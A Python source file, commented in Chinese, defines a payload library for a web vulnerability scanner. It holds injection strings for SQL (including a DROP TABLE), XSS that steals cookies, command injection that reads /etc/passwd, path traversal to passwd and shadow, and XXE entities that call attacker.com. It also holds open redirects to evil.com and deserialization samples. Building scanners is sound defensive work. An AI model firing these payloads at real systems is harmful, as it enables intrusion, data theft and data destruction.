"""Payload 库。

按漏洞类型组织检测 payload，支持分类检索和版本管理。
所有 payload 标注用途、风险等级和预期响应特征。
"""

from __future__ import annotations

from dataclasses import dataclass, field


@dataclass
class Payload:
    """单个检测 payload。"""

    value: str
    vuln_type: str
    technique: (
        str  # error_based / boolean_based / time_based / reflection / encoding_bypass
    )
    description: str = ""
    risk_level: str = "medium"  # low / medium / high
    expected_response: list[str] = field(default_factory=list)
    encoding: str = "raw"  # raw / url_encoded / base64 / hex


class PayloadLibrary:
    """Payload 库。

    按漏洞类型和技术分类管理检测 payload。
    支持按类型、技术、风险等级检索。
    """

    def __init__(self) -> None:
        self._payloads: dict[str, list[Payload]] = {}
        self._init_builtin()

    def _init_builtin(self) -> None:
        """初始化内置 payload 集。"""
        # --- SQL Injection ---
        sqli_payloads = [
            Payload(
                "'",
                "sqli",
                "error_based",
                "单引号触发 SQL 错误",
                "low",
                ["sql syntax", "unclosed quotation"],
            ),
            Payload(
                '"', "sqli", "error_based", "双引号触发 SQL 错误", "low", ["sql syntax"]
            ),
            Payload(
                "' OR '1'='1", "sqli", "boolean_based", "布尔 true 条件", "medium", []
            ),
            Payload(
                "' AND '1'='2",
                "sqli",
                "boolean_based",
                "布尔 false 条件（用于对比）",
                "medium",
                [],
            ),
            Payload(
                "' AND SLEEP(5)--", "sqli", "time_based", "时间延迟 5 秒", "high", []
            ),
            Payload(
                "1' OR '1'='1",
                "sqli",
                "boolean_based",
                "数字型参数布尔注入",
                "medium",
                [],
            ),
            Payload("admin'--", "sqli", "auth_bypass", "认证绕过", "high", []),
            Payload(
                "' UNION SELECT NULL--",
                "sqli",
                "union_based",
                "UNION 列数探测",
                "medium",
                ["column count"],
            ),
            Payload(
                "' UNION SELECT NULL,NULL--",
                "sqli",
                "union_based",
                "UNION 两列探测",
                "medium",
                [],
            ),
            Payload(
                "' UNION SELECT NULL,NULL,NULL--",
                "sqli",
                "union_based",
                "UNION 三列探测",
                "medium",
                [],
            ),
            Payload(
                "1;DROP TABLE users--",
                "sqli",
                "stacked",
                "堆叠查询（高危）",
                "high",
                [],
            ),
        ]
        for p in sqli_payloads:
            self.register(p)

        # --- XSS ---
        xss_payloads = [
            Payload(
                "<script>alert('xss')</script>",
                "xss",
                "reflection",
                "基础 script 标签",
                "medium",
                ["<script>alert('xss')</script>"],
            ),
            Payload(
                "<img src=x onerror=alert(1)>",
                "xss",
                "reflection",
                "img onerror 事件",
                "medium",
                ["onerror=alert"],
            ),
            Payload(
                "'\"><svg onload=alert(1)>",
                "xss",
                "reflection",
                "svg onload 事件",
                "medium",
                ["svg onload"],
            ),
            Payload(
                "<iframe src=javascript:alert(1)>",
                "xss",
                "reflection",
                "iframe src 注入",
                "medium",
                ["javascript:alert"],
            ),
            Payload(
                "<body onload=alert(1)>",
                "xss",
                "reflection",
                "body onload 事件",
                "medium",
                ["onload=alert"],
            ),
            Payload(
                "javascript:alert(1)",
                "xss",
                "reflection",
                "javascript 协议",
                "low",
                ["javascript:alert"],
            ),
            Payload(
                "<svg/onload=alert(1)>",
                "xss",
                "reflection",
                "svg 自闭合 onload",
                "medium",
                ["onload=alert"],
            ),
            Payload(
                "'\"><script>alert(document.cookie)</script>",
                "xss",
                "reflection",
                "Cookie 窃取",
                "high",
                ["document.cookie"],
            ),
            Payload(
                "%3Cscript%3Ealert(1)%3C/script%3E",
                "xss",
                "encoding_bypass",
                "URL 编码绕过",
                "medium",
                ["<script>alert(1)</script>"],
                "url_encoded",
            ),
            Payload(
                "<scr<script>ipt>alert(1)</script>",
                "xss",
                "filter_bypass",
                "双重 script 绕过过滤器",
                "medium",
                ["<script>alert"],
            ),
        ]
        for p in xss_payloads:
            self.register(p)

        # --- Command Injection ---
        cmdi_payloads = [
            Payload(
                ";id",
                "cmdi",
                "command_output",
                "追加 id 命令",
                "medium",
                ["uid=", "gid="],
            ),
            Payload(
                "|id",
                "cmdi",
                "command_output",
                "管道 id 命令",
                "medium",
                ["uid=", "gid="],
            ),
            Payload(
                "`id`",
                "cmdi",
                "command_output",
                "反引号执行",
                "medium",
                ["uid=", "gid="],
            ),
            Payload(
                "$(id)",
                "cmdi",
                "command_output",
                "命令替换",
                "medium",
                ["uid=", "gid="],
            ),
            Payload(
                ";whoami", "cmdi", "command_output", "追加 whoami 命令", "medium", []
            ),
            Payload(
                "|whoami", "cmdi", "command_output", "管道 whoami 命令", "medium", []
            ),
            Payload(
                ";cat /etc/passwd",
                "cmdi",
                "command_output",
                "读取 passwd 文件",
                "high",
                ["root:", "daemon:"],
            ),
            Payload(";sleep 5", "cmdi", "time_based", "时间延迟 5 秒", "high", []),
            Payload(
                "|timeout 5 ping localhost",
                "cmdi",
                "time_based",
                "时间延迟（替代方案）",
                "high",
                [],
            ),
            Payload(
                "&&id", "cmdi", "command_output", "逻辑与追加命令", "medium", ["uid="]
            ),
            Payload(
                "||id", "cmdi", "command_output", "逻辑或追加命令", "medium", ["uid="]
            ),
        ]
        for p in cmdi_payloads:
            self.register(p)

        # --- Path Traversal ---
        traversal_payloads = [
            Payload(
                "../../../etc/passwd",
                "traversal",
                "direct",
                "Linux 直接遍历",
                "medium",
                ["root:", "daemon:"],
            ),
            Payload(
                "....//....//....//etc/passwd",
                "traversal",
                "filter_bypass",
                "双重点绕过过滤器",
                "medium",
                ["root:"],
            ),
            Payload(
                "..%2f..%2f..%2fetc/passwd",
                "traversal",
                "encoding_bypass",
                "URL 编码遍历",
                "medium",
                ["root:"],
                "url_encoded",
            ),
            Payload(
                "..%252f..%252f..%252fetc/passwd",
                "traversal",
                "encoding_bypass",
                "双重 URL 编码",
                "medium",
                ["root:"],
                "url_encoded",
            ),
            Payload(
                "..\\..\\..\\windows\\win.ini",
                "traversal",
                "direct",
                "Windows 直接遍历",
                "medium",
                ["[fonts]", "[extensions]"],
            ),
            Payload(
                "....\\\\....\\\\....\\\\windows\\\\win.ini",
                "traversal",
                "filter_bypass",
                "Windows 双重点绕过",
                "medium",
                ["[fonts]"],
            ),
            Payload(
                "/etc/passwd",
                "traversal",
                "absolute",
                "绝对路径读取",
                "high",
                ["root:"],
            ),
            Payload(
                "/etc/shadow",
                "traversal",
                "absolute",
                "尝试读取 shadow（通常需要 root）",
                "high",
                [],
            ),
            Payload(
                "../../../etc/hostname",
                "traversal",
                "direct",
                "读取 hostname",
                "low",
                [],
            ),
            Payload(
                "..%c0%af..%c0%af..%c0%afetc/passwd",
                "traversal",
                "encoding_bypass",
                "UTF-8 编码绕过",
                "medium",
                ["root:"],
                "url_encoded",
            ),
        ]
        for p in traversal_payloads:
            self.register(p)

        # --- XXE ---
        xxe_payloads = [
            Payload(
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                "xxe",
                "file_read",
                "读取 /etc/passwd",
                "high",
                ["root:", "daemon:"],
            ),
            Payload(
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
                "xxe",
                "file_read",
                "读取 /etc/shadow",
                "high",
                [],
            ),
            Payload(
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
                "xxe",
                "ssrf",
                "SSRF 探测",
                "high",
                [],
            ),
            Payload(
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;]>',
                "xxe",
                "blind",
                "Blind XXE 外部 DTD",
                "high",
                [],
            ),
        ]
        for p in xxe_payloads:
            self.register(p)

        # --- Open Redirect ---
        redirect_payloads = [
            Payload(
                "https://evil.com",
                "open_redirect",
                "direct",
                "直接外部 URL",
                "medium",
                [],
            ),
            Payload(
                "//evil.com",
                "open_redirect",
                "protocol_relative",
                "协议相对 URL",
                "medium",
                [],
            ),
            Payload(
                "/\\evil.com", "open_redirect", "backslash", "反斜杠绕过", "medium", []
            ),
            Payload("https:evil.com", "open_redirect", "colon", "冒号绕过", "low", []),
            Payload(
                "//evil.com/%2f%2f",
                "open_redirect",
                "encoding",
                "编码绕过",
                "medium",
                [],
                "url_encoded",
            ),
        ]
        for p in redirect_payloads:
            self.register(p)

        # --- Deserialization ---
        deserial_payloads = [
            Payload(
                "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRwAIAA0kACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cA==",
                "deserialization",
                "java",
                "Java HashMap 序列化对象",
                "high",
                [],
                "base64",
            ),
            Payload(
                'O:8:"stdClass":0:{}',
                "deserialization",
                "php",
                "PHP 序列化对象",
                "high",
                [],
            ),
            Payload(
                "!!python/object:__main__.Test {}",
                "deserialization",
                "python",
                "PyYAML 不安全加载",
                "high",
                [],
            ),
            Payload(
                "\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00\x8c\x05admin\x94.",
                "deserialization",
                "python",
                "Python pickle 数据",
                "high",
                [],
                "hex",
            ),
        ]
        for p in deserial_payloads:
            self.register(p)

    def register(self, payload: Payload) -> None:
        """注册一个 payload。"""
        self._payloads.setdefault(payload.vuln_type, []).append(payload)

    def get_by_type(self, vuln_type: str) -> list[Payload]:
        """获取指定漏洞类型的所有 payload。"""
        return list(self._payloads.get(vuln_type, []))

    def get_by_technique(self, vuln_type: str, technique: str) -> list[Payload]:
        """获取指定漏洞类型和技术的 payload。"""
        return [
            p for p in self._payloads.get(vuln_type, []) if p.technique == technique
        ]

    def get_safe_payloads(self, vuln_type: str) -> list[Payload]:
        """获取低风险的探测 payload（用于初始检测）。"""
        return [
            p
            for p in self._payloads.get(vuln_type, [])
            if p.risk_level in ("low", "medium")
        ]

    def list_types(self) -> list[str]:
        """列出所有已注册的漏洞类型。"""
        return sorted(self._payloads.keys())

    def stats(self) -> dict[str, int]:
        """返回各漏洞类型的 payload 数量统计。"""
        return {vt: len(payloads) for vt, payloads in self._payloads.items()}
